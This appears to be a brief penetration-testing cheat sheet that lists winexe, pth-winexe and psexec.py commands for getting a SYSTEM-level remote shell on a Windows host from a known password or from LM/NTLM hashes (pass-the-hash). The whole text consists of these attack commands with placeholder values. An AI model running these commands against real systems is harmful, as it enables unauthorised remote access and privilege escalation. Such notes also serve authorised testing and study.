Credentials or Hash: [ Note we can escalate our privileges to admin/System by using some tools which allows us to access cmd via linux terminal.]

1. winexe [ Password based access]

-- winexe -U 'username%password' //IP cmd.exe --system (If we want to use cmd as system then --system)

2. pth-winexe [ Hash based access Pass-The-Hash ]

-- pth-winexe -U 'username%LM-HASH:NTLM-HASH' //IP cmd.exe --system (If we want to use cmd as system then --system)

3. psexec.py [With Credentials]

-- psexec.py 'username:password@IP' [ Executes shell as SYSTEM if credentials for admin account is correct]

4. psexec.py [ Hash based access Pass-The-Hash ]

-- psexec.py 'username@IP' -hashes 'LM-HASH:NTLM-HASH'
